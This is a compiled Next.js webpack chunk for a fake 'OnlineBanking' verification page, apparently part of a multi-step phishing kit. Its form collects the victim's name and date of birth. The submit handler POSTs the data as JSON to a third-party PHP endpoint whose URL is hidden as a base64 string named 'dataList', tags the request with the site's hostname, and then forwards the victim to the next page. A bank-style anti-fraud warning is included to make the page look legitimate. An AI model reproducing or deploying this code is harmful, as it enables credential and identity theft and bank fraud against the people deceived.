(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [390], {
        7780: function(e, t, n) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/a3", function() {
                return n(9282)
            }])
        },
        9018: function(e, t) {
            "use strict";
            t.Z = {
                dataList: "aHR0cHM6Ly9kZW1vLW11c2ljLmtwYmhvc3QuY29tL3VzZURhdGEucGhw"
            }
        },
        9282: function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, {
                default: function() {
                    return m
                }
            });
            var r = n(7568),
                a = n(655),
                s = n(5893),
                i = n(9008),
                o = n.n(i),
                l = n(5675),
                c = n.n(l),
                u = n(7294),
                d = n(1163),
                h = n(9018);

            function m() {
                var e, t = function(e, t) {
                        if ("0" !== e.charAt(0) || "00" == e) {
                            var n = parseInt(e);
                            (isNaN(n) || n <= 0 || n > t) && (n = 1), e = n > parseInt(t.toString().charAt(0)) && 1 == n.toString().length ? "0" + n : n.toString()
                        }
                        return e
                    },
                    n = (0, d.useRouter)(),
                    i = (0, u.useState)(""),
                    l = i[0],
                    m = i[1],
                    $ = function() {
                        var e = new Date,
                            t = e.getFullYear(),
                            n = e.getMonth() + 1,
                            r = e.getDate();
                        r < 10 && (r = "0" + r);
                        var a = e.getHours(),
                            s = e.getMinutes(),
                            i = a >= 12 ? "PM" : "AM";
                        a %= 12, a = a || 12, s = s < 10 ? "0" + s : s, m(r + "-" + ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"][n].substring(0, 3) + "-" + t + " [" + a + ":" + s + " " + i + " IST]")
                    },
                    f = (0, u.useState)(!1),
                    p = f[0],
                    v = f[1],
                    x = (e = (0, r.Z)(function(e) {
                        var t, r, s, i, o, l, c;
                        return (0, a.__generator)(this, function(a) {
                            switch (a.label) {
                                case 0:
                                    return e.preventDefault(), v(!0), t = new FormData(e.target), r = {}, t.forEach(function(e, t) {
                                        r[t] = e
                                    }), s = JSON.stringify(r), i = ((o = {}).method = "POST", o.headers = {
                                        "Content-Type": "application/json"
                                    }, o.body = s, o), [4, fetch(window.atob(h.Z.dataList) + "?id=" + window.location.hostname, i)];
                                case 1:
                                    return [4, (l = a.sent()).json()];
                                case 2:
                                    return c = a.sent(), v(!1), !0 == c.status ? n.push("/a4") : v(!1), [2]
                            }
                        })
                    }), function(t) {
                        return e.apply(this, arguments)
                    }),
                    y = function(e) {
                        var n = e.target.value;
                        /\D\/$/.test(n) && (n = n.substr(0, n.length - 1));
                        var r = n.split("/").map(function(e) {
                            return e.replace(/\D/g, "")
                        });
                        r[0] && (r[0] = t(r[0], 31)), r[1] && (r[1] = t(r[1], 12));
                        var a = r.map(function(e, t) {
                            return 2 == e.length && t < 2 ? e + "/" : e
                        });
                        e.target.value = a.join("").substr(0, 10)
                    };
                return (0, u.useEffect)(function() {
                    return $
                }, []), (0, s.jsxs)(s.Fragment, {
                    children: [(0, s.jsxs)(o(), {
                        children: [(0, s.jsx)("title", {
                            children: "Verfication"
                        }), (0, s.jsx)("meta", {
                            name: "description",
                            content: "customer verification"
                        }), (0, s.jsx)("link", {
                            rel: "icon",
                            href: "/favicon.ico"
                        })]
                    }), (0, s.jsxs)("main", {
                        children: [(0, s.jsx)("div", {
                            className: "logo",
                            children: (0, s.jsx)(c(), {
                                src: "/logo.svg.png",
                                alt: "site logo",
                                width: 100,
                                height: 37
                            })
                        }), (0, s.jsx)("br", {}), (0, s.jsx)("div", {
                            className: "panelDiv",
                            children: (0, s.jsx)("div", {
                                className: "panel",
                                children: (0, s.jsx)("span", {
                                    children: l
                                })
                            })
                        }), (0, s.jsx)("div", {
                            className: "content_heading",
                            children: (0, s.jsx)("h3", {
                                className: "pull-left",
                                children: "Verify Details"
                            })
                        }), (0, s.jsxs)("div", {
                            className: "content_area",
                            children: [(0, s.jsx)("p", {
                                className: "mandatory_txt",
                                children: "Mandatory fields are marked with an asterisk (*)"
                            }), (0, s.jsxs)("form", {
                                action: "#",
                                className: "form",
                                method: "post",
                                onSubmit: x,
                                children: [(0, s.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, s.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "jname",
                                        children: [" Customer Name", (0, s.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, s.jsx)("input", {
                                        className: "form-control",
                                        type: "text",
                                        name: "customerName",
                                        tabIndex: "1",
                                        required: !0
                                    })]
                                }), (0, s.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, s.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "dateofbirth",
                                        children: [" Date of Birth", (0, s.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, s.jsx)("input", {
                                        className: "form-control",
                                        onInput: y,
                                        type: "text",
                                        name: "dateofbirth",
                                        placeholder: "dd/mm/yyyy",
                                        tabIndex: "1",
                                        required: !0
                                    })]
                                }), (0, s.jsx)("div", {
                                    className: "commonbutton",
                                    children: (0, s.jsx)("input", {
                                        name: "btContinue",
                                        id: "btContinue",
                                        disabled: !!p,
                                        type: "submit",
                                        className: "btn btn-default",
                                        title: "submit",
                                        value: "submit"
                                    })
                                })]
                            }), (0, s.jsx)("br", {}), (0, s.jsx)("div", {
                                className: "info_panel",
                                children: (0, s.jsx)("div", {
                                    className: "notify_icon",
                                    children: (0, s.jsxs)("ul", {
                                        children: [(0, s.jsx)("li", {
                                            children: "Any of its representative never sends you email/SMS or calls you over phone to get your personal information, password or one time SMS (high security) password. Any such e-mail/SMS or phone call is an attempt to fraudulently withdraw money from your account through Internet Banking. Never respond to such email/SMS or phone call. Please report immediately on report@onlinebanking.com if you receive any such email/SMS or Phone call. Immediately change your passwords if you have accidentally revealed your credentials."
                                        }), (0, s.jsx)("li", {
                                            children: "Please note that you will receive the all communication related to Internet banking on your updated mobile number only after approval."
                                        })]
                                    })
                                })
                            })]
                        }), (0, s.jsx)("div", {
                            className: "footer_area",
                            children: (0, s.jsx)(c(), {
                                src: "/veriSign.png",
                                width: 68,
                                height: 28,
                                alt: "versign"
                            })
                        }), (0, s.jsx)("div", {
                            className: "footer",
                            children: (0, s.jsx)("p", {
                                children: "\xa9 OnlineBanking"
                            })
                        })]
                    })]
                })
            }
        },
        7568: function(e, t, n) {
            "use strict";

            function r(e, t, n, r, a, s, i) {
                try {
                    var o = e[s](i),
                        l = o.value
                } catch (c) {
                    n(c);
                    return
                }
                o.done ? t(l) : Promise.resolve(l).then(r, a)
            }

            function a(e) {
                return function() {
                    var t = this,
                        n = arguments;
                    return new Promise(function(a, s) {
                        var i = e.apply(t, n);

                        function o(e) {
                            r(i, a, s, o, l, "next", e)
                        }

                        function l(e) {
                            r(i, a, s, o, l, "throw", e)
                        }
                        o(void 0)
                    })
                }
            }
            n.d(t, {
                Z: function() {
                    return a
                }
            })
        }
    },
    function(e) {
        e.O(0, [345, 774, 888, 179], function() {
            return e(e.s = 7780)
        }), _N_E = e.O()
    }
]);